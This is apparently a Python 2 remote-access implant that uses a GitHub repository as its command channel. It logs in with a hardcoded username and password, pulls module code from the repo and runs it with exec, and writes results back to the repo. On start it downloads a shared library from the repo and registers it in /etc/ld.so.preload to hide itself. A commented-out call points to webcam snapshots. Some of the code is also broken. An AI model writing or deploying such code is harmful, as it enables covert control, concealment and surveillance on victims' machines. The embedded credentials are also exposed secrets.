#!/usr/bin/python

import imp
import sys
import base64
import time
import os
from github3 import login
from subprocess import call
import urllib
def connect_to_github() :
	gh = login("mehdi-desu",password="1090prixttc")
	repo = gh.repository("mehdi-desu","projet_impossible")
	branch = repo.branch("master")

	return gh,repo,branch	


def get_file_contents(file_path):
    gh, repo, branch = connect_to_github()
    if gh and repo and branch:
        hash_list = branch.commit.commit.tree.recurse().tree
	
        for hash in hash_list:
            if file_path in hash.path:
                file_contents_b64 = repo.blob(hash.sha).content
                file_contents = base64.b64decode(file_contents_b64).decode("utf-8")
                return file_contents
    return none

def load_module(name):
	module = imp.new_module(name)
	exec(get_file_contents("modules/"+name+".py"), module.__dict__)
	sys.modules[name] = module
	return module

def store_module_result() :
	gh,repo,branch = connect_to_github()
	repo.create_file("data/ss.txt","add a file", "a stupid string")

 
def hide():
	urllib.urlretrieve('https://raw.github.com/mehdi-desu/projet_impossible/master/modules/hider.so','/usr/local/lib/hider.so') 
 	f = open('/etc/ld.so.preload','w')
	f.write("/usr/local/lib/hider.so")
	f.close()
hide()
#cam = load_module("cam")
while True:
#	cam.snap()
	print "ddd"
	time.sleep(1)
